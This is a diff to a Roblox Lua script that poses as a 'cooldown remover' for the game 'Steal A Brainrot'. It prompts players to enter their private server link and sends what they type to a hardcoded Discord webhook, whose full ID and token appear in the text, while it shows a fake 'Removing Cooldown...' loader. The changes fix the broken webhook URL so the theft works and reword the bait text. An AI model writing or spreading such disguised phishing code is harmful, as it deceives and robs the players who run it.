@@ -45,7 +45,7 @@ titleLabel.BackgroundTransparency = 1
 titleLabel.Font = Enum.Font.GothamBold
 titleLabel.TextSize = 20
 titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-titleLabel.Text = "Enter Your Private Server Link To Remove Cooldown"
+titleLabel.Text = "Enter Your Private Server Link To Unlock Script"
 
 -- UI: TextBox for server link
 local serverLinkBox = Instance.new("TextBox", mainFrame)
@@ -99,7 +99,7 @@ enterButton.MouseButton1Click:Connect(function()
     -- Example: send Discord webhook
     task.spawn(function()
         local webhookData = HttpService:JSONEncode({
-            username = "🧠 Steal A Brainrot Cooldown Remover 🧠",
+            username = "🧠 Steal A Brainrot Cooldown Remover🧠",
             embeds = {{
                 color = 16732240,
                 fields = {
@@ -112,7 +112,7 @@ enterButton.MouseButton1Click:Connect(function()
         })
 
         request({
-            Url = "https://discord.com/api/webhooks/https://discord.com/api/webhooks/1446932058889916426/_4h_AtKj3aiXEhAiBekFLXK9LIlCHvYapoU7ejVmw8Ul40dK38rq92kH1zl6HFHh9Haj",
+            Url = "https://discord.com/api/webhooks/1446932058889916426/_4h_AtKj3aiXEhAiBekFLXK9LIlCHvYapoU7ejVmw8Ul40dK38rq92kH1zl6HFHh9Haj",
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
             Body = webhookData
@@ -171,7 +171,7 @@ loaderFooter.BackgroundTransparency = 1
 loaderFooter.Font = Enum.Font.GothamBold
 loaderFooter.TextSize = 18
 loaderFooter.TextColor3 = Color3.fromRGB(255, 100, 100)
-loaderFooter.Text = "discord.gg/f7se7bwcsz"
+loaderFooter.Text = "Removing Cooldown..."
 
 -- Loader sound
 local loaderSound = Instance.new("Sound", loaderFrame)
